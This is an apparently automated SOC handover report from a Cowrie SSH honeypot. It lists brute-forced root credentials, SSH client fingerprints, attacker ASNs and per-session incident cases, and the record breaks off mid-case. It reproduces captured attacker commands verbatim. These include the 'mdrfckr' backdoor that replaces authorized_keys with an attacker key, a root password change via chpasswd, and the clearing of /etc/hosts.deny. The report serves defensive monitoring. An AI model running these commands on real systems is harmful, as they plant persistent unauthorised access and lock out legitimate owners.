# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-08 |
| **Generated At** | 2026-04-08T07:16:07Z |
| **Shift Time** | 07:16 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **104** |
| Confirmed Threats | **102** |
| False Positives Filtered | **2** (1.9%) |
| Unique Attacker IPs | **17** |
| Countries of Origin | **10** |
| High Severity Cases | **42** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **62** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **74** |
| Unique Credential Pairs | **35** |
| Unique Usernames | **14** |
| Unique Passwords | **35** |
| Successful Auth Pairs | **33** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 42 |
| `345gs5662d34` | 19 |
| `ubuntu` | 2 |
| `dev` | 1 |
| `bot` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 20 |
| `345gs5662d34` | 19 |
| `Root321@` | 2 |
| `qazwsx0000@123` | 2 |
| `Password!1` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 20 |
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `Root321@` | 2 |
| `root` | `qazwsx0000@123` | 2 |
| `ubuntu` | `Password!1` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `aaAA12345` | `120.71.149.30` | 2026-04-08T06:46:38 |
| `root` | `Root321@` | `194.163.168.58` | 2026-04-08T06:46:44 |
| `root` | `3245gs5662d34` | `194.163.168.58` | 2026-04-08T06:46:47 |
| `root` | `3245gs5662d34` | `120.71.149.30` | 2026-04-08T06:46:59 |
| `root` | `qazwsx2018` | `180.184.36.192` | 2026-04-08T06:47:26 |
| `root` | `3245gs5662d34` | `180.184.36.192` | 2026-04-08T06:47:30 |
| `root` | `qazwsx111@#` | `41.242.115.83` | 2026-04-08T06:49:29 |
| `root` | `3245gs5662d34` | `41.242.115.83` | 2026-04-08T06:49:34 |
| `root` | `Qazwsx123123!!` | `69.74.29.21` | 2026-04-08T06:50:21 |
| `root` | `3245gs5662d34` | `69.74.29.21` | 2026-04-08T06:50:27 |
| `root` | `A12345671` | `41.242.115.83` | 2026-04-08T06:53:16 |
| `root` | `qazwsx0000@123` | `1.94.220.55` | 2026-04-08T06:56:39 |
| `root` | `3245gs5662d34` | `1.94.220.55` | 2026-04-08T06:56:43 |
| `root` | `Qazwsx12@` | `41.242.115.83` | 2026-04-08T06:56:54 |
| `root` | `Qwertyuiop$` | `41.242.115.83` | 2026-04-08T06:58:38 |
| `root` | `Zhang@123` | `27.112.78.223` | 2026-04-08T06:59:14 |
| `root` | `3245gs5662d34` | `27.112.78.223` | 2026-04-08T06:59:20 |
| `root` | `Root321@` | `41.242.115.83` | 2026-04-08T07:00:24 |
| `root` | `xxBB112233` | `212.88.48.17` | 2026-04-08T07:00:25 |
| `root` | `3245gs5662d34` | `212.88.48.17` | 2026-04-08T07:00:30 |
| `root` | `ddDD123` | `186.80.18.158` | 2026-04-08T07:00:33 |
| `root` | `3245gs5662d34` | `186.80.18.158` | 2026-04-08T07:00:40 |
| `root` | `y` | `41.242.115.83` | 2026-04-08T07:02:17 |
| `root` | `qazwsx0000@123` | `45.78.194.186` | 2026-04-08T07:04:11 |
| `root` | `3245gs5662d34` | `45.78.194.186` | 2026-04-08T07:04:18 |
| `root` | `Root123456@#` | `41.242.115.83` | 2026-04-08T07:05:57 |
| `root` | `Qazwsx123321..` | `14.103.37.34` | 2026-04-08T07:06:04 |
| `root` | `Admin12345@` | `14.103.37.34` | 2026-04-08T07:07:12 |
| `root` | `3245gs5662d34` | `14.103.37.34` | 2026-04-08T07:07:18 |
| `root` | `ccAA1234` | `41.242.115.83` | 2026-04-08T07:07:53 |
| `root` | `Root2025@` | `41.242.115.83` | 2026-04-08T07:13:17 |
| `root` | `1qazxsw2!@` | `14.103.37.34` | 2026-04-08T07:13:56 |
| `root` | `Qwer1234@` | `41.242.115.83` | 2026-04-08T07:15:09 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **104** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 85 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 84 | 11 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `c1953cec4623...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 84 | 11 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `c1953cec4623...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 20 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:qahLWkmPM43p"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.37.34`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.71.149.30`, `27.112.78.223`, `180.184.36.192`, `194.163.168.58`, `14.103.37.34`, `69.74.29.21`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **17** |
| Unique ASNs | **17** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS55990` | Huawei Cloud Service data center | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS9762` | kt HCN Co.,Ltd. | 1 | HIGH |
| `AS56046` | China Mobile communications corporation | 1 | HIGH |
| `AS150436` | Byteplus Pte. Ltd. | 1 | HIGH |
| `AS5413` | Wavenet Limited | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (42)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7cae056e13ec

| Field | Detail |
|---|---|
| **Source IP** | `120.71.149[.]30` |
| **First Seen** | 2026-04-08 06:46 |
| **Last Seen** | 2026-04-08 06:46 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:46:37` | `cowrie.session.connect` |
| `2026-04-08 06:46:37` | `cowrie.client.version` |
| `2026-04-08 06:46:37` | `cowrie.client.kex` |
| `2026-04-08 06:46:38` | `cowrie.login.success` |
| `2026-04-08 06:46:40` | `cowrie.session.params` |
| `2026-04-08 06:46:40` | `cowrie.command.input` |
| `2026-04-08 06:46:40` | `cowrie.command.failed` |
| `2026-04-08 06:46:41` | `cowrie.log.closed` |
| `2026-04-08 06:46:45` | `cowrie.session.params` |
| `2026-04-08 06:46:45` | `cowrie.command.input` |
| `2026-04-08 06:46:46` | `cowrie.session.file_download` |
| `2026-04-08 06:46:46` | `cowrie.log.closed` |
| `2026-04-08 06:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.71.149[.]30` to AbuseIPDB if not already reported
- [ ] Block `120.71.149[.]30` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3e26aecc7a

| Field | Detail |
|---|---|
| **Source IP** | `194.163.168[.]58` |
| **First Seen** | 2026-04-08 06:46 |
| **Last Seen** | 2026-04-08 06:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:46:43` | `cowrie.session.connect` |
| `2026-04-08 06:46:43` | `cowrie.client.version` |
| `2026-04-08 06:46:43` | `cowrie.client.kex` |
| `2026-04-08 06:46:44` | `cowrie.login.success` |
| `2026-04-08 06:46:44` | `cowrie.session.params` |
| `2026-04-08 06:46:44` | `cowrie.command.input` |
| `2026-04-08 06:46:44` | `cowrie.command.failed` |
| `2026-04-08 06:46:44` | `cowrie.log.closed` |
| `2026-04-08 06:46:44` | `cowrie.session.params` |
| `2026-04-08 06:46:44` | `cowrie.command.input` |
| `2026-04-08 06:46:44` | `cowrie.session.file_download` |
| `2026-04-08 06:46:44` | `cowrie.log.closed` |
| `2026-04-08 06:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.168[.]58` to AbuseIPDB if not already reported
- [ ] Block `194.163.168[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f87bd9bb5ed

| Field | Detail |
|---|---|
| **Source IP** | `194.163.168[.]58` |
| **First Seen** | 2026-04-08 06:46 |
| **Last Seen** | 2026-04-08 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:46:47` | `cowrie.session.connect` |
| `2026-04-08 06:46:47` | `cowrie.client.version` |
| `2026-04-08 06:46:47` | `cowrie.client.kex` |
| `2026-04-08 06:46:47` | `cowrie.login.success` |
| `2026-04-08 06:46:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.163.168[.]58` to AbuseIPDB if not already reported
- [ ] Block `194.163.168[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65d57991378f

| Field | Detail |
|---|---|
| **Source IP** | `120.71.149[.]30` |
| **First Seen** | 2026-04-08 06:46 |
| **Last Seen** | 2026-04-08 06:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:46:52` | `cowrie.session.connect` |
| `2026-04-08 06:46:52` | `cowrie.client.version` |
| `2026-04-08 06:46:53` | `cowrie.client.kex` |
| `2026-04-08 06:46:59` | `cowrie.login.success` |
| `2026-04-08 06:46:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.71.149[.]30` to AbuseIPDB if not already reported
- [ ] Block `120.71.149[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218b5a823b72

| Field | Detail |
|---|---|
| **Source IP** | `180.184.36[.]192` |
| **First Seen** | 2026-04-08 06:47 |
| **Last Seen** | 2026-04-08 06:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:47:24` | `cowrie.session.connect` |
| `2026-04-08 06:47:24` | `cowrie.client.version` |
| `2026-04-08 06:47:25` | `cowrie.client.kex` |
| `2026-04-08 06:47:26` | `cowrie.login.success` |
| `2026-04-08 06:47:26` | `cowrie.session.params` |
| `2026-04-08 06:47:26` | `cowrie.command.input` |
| `2026-04-08 06:47:26` | `cowrie.command.failed` |
| `2026-04-08 06:47:26` | `cowrie.log.closed` |
| `2026-04-08 06:47:26` | `cowrie.session.params` |
| `2026-04-08 06:47:26` | `cowrie.command.input` |
| `2026-04-08 06:47:27` | `cowrie.session.file_download` |
| `2026-04-08 06:47:27` | `cowrie.log.closed` |
| `2026-04-08 06:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.36[.]192` to AbuseIPDB if not already reported
- [ ] Block `180.184.36[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e34fce0d4f

| Field | Detail |
|---|---|
| **Source IP** | `180.184.36[.]192` |
| **First Seen** | 2026-04-08 06:47 |
| **Last Seen** | 2026-04-08 06:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:47:30` | `cowrie.session.connect` |
| `2026-04-08 06:47:30` | `cowrie.client.version` |
| `2026-04-08 06:47:30` | `cowrie.client.kex` |
| `2026-04-08 06:47:30` | `cowrie.login.success` |
| `2026-04-08 06:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.184.36[.]192` to AbuseIPDB if not already reported
- [ ] Block `180.184.36[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710c91eb4654

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:49 |
| **Last Seen** | 2026-04-08 06:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:49:28` | `cowrie.session.connect` |
| `2026-04-08 06:49:28` | `cowrie.client.version` |
| `2026-04-08 06:49:28` | `cowrie.client.kex` |
| `2026-04-08 06:49:29` | `cowrie.login.success` |
| `2026-04-08 06:49:29` | `cowrie.session.params` |
| `2026-04-08 06:49:29` | `cowrie.command.input` |
| `2026-04-08 06:49:29` | `cowrie.command.failed` |
| `2026-04-08 06:49:30` | `cowrie.log.closed` |
| `2026-04-08 06:49:30` | `cowrie.session.params` |
| `2026-04-08 06:49:30` | `cowrie.command.input` |
| `2026-04-08 06:49:30` | `cowrie.session.file_download` |
| `2026-04-08 06:49:30` | `cowrie.log.closed` |
| `2026-04-08 06:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea315a46f422

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:49 |
| **Last Seen** | 2026-04-08 06:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:49:33` | `cowrie.session.connect` |
| `2026-04-08 06:49:33` | `cowrie.client.version` |
| `2026-04-08 06:49:33` | `cowrie.client.kex` |
| `2026-04-08 06:49:34` | `cowrie.login.success` |
| `2026-04-08 06:49:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45c20c449ccb

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-04-08 06:50 |
| **Last Seen** | 2026-04-08 06:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:50:19` | `cowrie.session.connect` |
| `2026-04-08 06:50:19` | `cowrie.client.version` |
| `2026-04-08 06:50:20` | `cowrie.client.kex` |
| `2026-04-08 06:50:21` | `cowrie.login.success` |
| `2026-04-08 06:50:21` | `cowrie.session.params` |
| `2026-04-08 06:50:21` | `cowrie.command.input` |
| `2026-04-08 06:50:21` | `cowrie.command.failed` |
| `2026-04-08 06:50:21` | `cowrie.log.closed` |
| `2026-04-08 06:50:22` | `cowrie.session.params` |
| `2026-04-08 06:50:22` | `cowrie.command.input` |
| `2026-04-08 06:50:22` | `cowrie.session.file_download` |
| `2026-04-08 06:50:22` | `cowrie.log.closed` |
| `2026-04-08 06:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038e840fc54b

| Field | Detail |
|---|---|
| **Source IP** | `69.74.29[.]21` |
| **First Seen** | 2026-04-08 06:50 |
| **Last Seen** | 2026-04-08 06:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:50:25` | `cowrie.session.connect` |
| `2026-04-08 06:50:25` | `cowrie.client.version` |
| `2026-04-08 06:50:26` | `cowrie.client.kex` |
| `2026-04-08 06:50:27` | `cowrie.login.success` |
| `2026-04-08 06:50:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.74.29[.]21` to AbuseIPDB if not already reported
- [ ] Block `69.74.29[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6405e057d162

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:53 |
| **Last Seen** | 2026-04-08 06:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-08 06:53:15` | `cowrie.session.connect` |
| `2026-04-08 06:53:15` | `cowrie.client.version` |
| `2026-04-08 06:53:15` | `cowrie.client.kex` |
| `2026-04-08 06:53:16` | `cowrie.login.success` |
| `2026-04-08 06:53:17` | `cowrie.session.params` |
| `2026-04-08 06:53:17` | `cowrie.command.input` |
| `2026-04-08 06:53:17` | `cowrie.command.failed` |
| `2026-04-08 06:53:17` | `cowrie.log.closed` |
| `2026-04-08 06:53:18` | `cowrie.session.params` |
| `2026-04-08 06:53:18` | `cowrie.command.input` |
| `2026-04-08 06:53:18` | `cowrie.session.file_download` |
| `2026-04-08 06:53:18` | `cowrie.log.closed` |
| `2026-04-08 06:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.242.115[.]83` to AbuseIPDB if not already reported
- [ ] Block `41.242.115[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862eb9cd185b

| Field | Detail |
|---|---|
| **Source IP** | `41.242.115[.]83` |
| **First Seen** | 2026-04-08 06:53 |
| **Last Seen** | 2026-04-08 06:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
